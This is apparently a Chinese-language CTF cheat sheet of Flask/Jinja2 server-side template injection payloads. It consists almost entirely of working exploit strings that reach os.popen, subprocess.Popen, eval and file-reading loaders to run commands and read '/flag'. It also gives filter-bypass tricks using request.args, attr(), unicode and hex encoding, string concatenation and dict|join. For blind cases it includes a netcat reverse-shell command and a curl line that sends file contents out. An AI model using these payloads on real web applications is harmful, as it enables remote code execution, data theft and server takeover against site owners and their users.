1:利用os.popen()命令执行
2:利用_frozen_external_importlib.FileLoader的get_data函数读取文件
3：利用subprocess.Popen执行命令

过滤config
{{url_for.__globals__['current_app'].config.FLAG}}
有os模块的类-》__init__方法-》globals命名空间-》os模块的popen
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}
有os模块的方法-》globals命名空间-》os模块的popen
get_flashed_messages   lipsum   url_for
{{ url_for.__globals__['os'].popen('cat /flag').read() }}
找一个有os模块的类-》__init__方法-》os模块的popen
{{ ''.__class__.__base__[0].__subclasses__()[xxx].__init__.__globals__['os'].popen('cat /flag').read() }}
找一个有__builtins__的子类-》利用其中的eval导入os模块-》os模块的popen
{{ ().__class__.__base__[0].__subclasses__()[xxx].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()') }}
找_frozen_importlib.BuiltinImporter-》使用load_module导入os模块-》os模块的popen
{{ [].__class__.__base__[0].__subclasses__()[xxx]["load_module"]("os")["popen"]('cat /flag').read() }}
找linecache函数-》利用os模块
{{ ''.__class__.__base__[0].__subclasses__()[xxx].__init__.__globals__['linecache']['os'].popen('cat /flag').read() }}

找_frozen_external_importlib.FileLoader-》利用get_data读取文件
{{ ''..__class__.__mro__[1].__subclasses__()[xxx]["get_data"](0,"/flag") }}

利用subprocess.Popen类执行命令
{{ [].__class__.__base__[0].__subclasses__()[xxx]('cat /flag',shell=True,stdout=-1).communicate()[0].strip() }}

1:过滤双大括号{{}}
使用{% %}    {% end... %} 下例：
<ul>
    {% for girl in girls %}
     <li>{{girl}}</li>
    {% endfor %}
</ul>
测试：{% if 2>1 %}foobar{% endif %}
通过有没有回显测试类是否存在
{% if ''.__class__ %}foobar{% endif %}
有回显则命令成功
{% if ''.__class__.__base__[0].__subclasses__()[xxx].__init__.globals__['os'].popen('cat /flag').read() %}foobar{% endif %}
然后读取
{%  print(url_for.__globals__['os']['popen']('cat /flag').read()) %}

无回显
1：使用popen反弹shell   popen('netcat 127.0.0.1 33333 -e /bin/bash')
2：带外注入（盲打） 利用dnslog平台等       popen('curl http://127.0.0.1/`cat /flag`')
3：纯盲注    爆内容（用于第一关，没啥鸟用）

过滤[]  用.__getitem__()代替

引号' "被过滤  使用flask中的request
url:   xxxxxx?os=os
__globals__['os']使用__globals__[request.args.os]

下划线_被过滤   用其他参数传递,结合上面使用request获取,然后|attr()解析
如().__class__  -->>    xxxxx/?cla=__class__   ()|attr(request.args.cla)
编码绕过 unicode编码  注意是给attr内的编码
比如 attr("__class__") -->>attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")注意不能有空格\u000a
也可以只编码_  -> \u005f
或者十六进制编码 _ -> \x5f

.被过滤
1:用|attr()    2:用[]代替   os.popen()  ->os['popen']
.后面要直接跟属性名   []内则可以动态计算，所以[a~b]是合法的
关键字被过滤，如class  arg  global
以__class__为例
1:字符编码   如unicode编码，十六进制编码
2:拼接  "__cl"+"ass__"
3:使用jinjia2的'~'进行拼接: {%set a="__cla"%}{%set b="ss__"%}{{()[a~b]}}
4:使用过滤器（reverse反转、replace替换、join拼接等）：{%set a="_ssalc__"|reverse%}{{a}}
5:利用python的char()    char()

数字被过滤
{%set a='aaa'|length %}{{a}}  a=3
{%set a='aaa'|length*'aaaaaa'|length %}{{a}} a=18   加减乘除都可以

过滤config
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
{{lipsum.__globals__['current_app'].config}}
这三个都是加载好的

混合过滤  dict() 和join过滤器
dict()生成字典，join获取键名并且自动拼接
{%set a=dict(foobar=1)%}  {'foobar':'1'}
{%set a=dict(foobar=1)|join%} foobar
{%set a=dict(__cla=1,ss=2)|join %}{{a}}
利用flask内置函数和对象获取符号
{%set a=(lipsum|string)%}{{a}}
<function generate_lorem_ipsum at 0x7fab35659048>
从这个回显字符串中获取空格和下划线  使用[]
{%set a=(lipsum|string|list)%}{{a}}
{%set a=(lipsum|string)[10]%}{{a}}